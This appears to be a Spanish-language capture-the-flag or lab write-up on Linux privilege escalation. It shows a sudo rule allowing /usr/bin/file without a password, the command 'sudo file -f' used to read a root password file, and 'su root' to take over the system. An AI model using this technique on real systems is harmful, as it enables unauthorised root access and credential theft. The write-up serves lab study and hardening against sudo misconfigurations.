# 🎯 Objetivo

Escalar privilegios desde usuario estándar a root.

---

# 📌 Vector identificado

Configuración insegura de sudo que permite ejecutar el binario `file` sin contraseña.

---

# 🔍 Enumeración

Comprobación de permisos sudo:

```bash
sudo -l
```

Salida relevante:

```text
(ALL) NOPASSWD: /usr/bin/file
```

👉 El usuario puede ejecutar `file` como root sin autenticación.

---

# 🔧 Explotación

Uso del binario permitido para leer archivos sensibles:

```bash
sudo file -f /opt/password.txt
```

Resultado:

```text
root:rooteable2
```

👉 Obtención de credenciales de root.

---

# 💣 Escalada final

```bash
su root
```

👉 Acceso completo al sistema.

---

# 📊 Resultado

* Privilegios root obtenidos
* Acceso a archivos críticos
* Control total del sistema

---

# 🧠 Análisis

* Uso inseguro de sudo
* Binario aparentemente inofensivo con capacidad de abuso
* Falta de control sobre comandos permitidos

👉 Vulnerabilidad: **Sudo Misconfiguration (GTFOBins)**

---

# 🚀 Siguiente paso

* Acceso a flags
* Validación completa del sistema comprometido

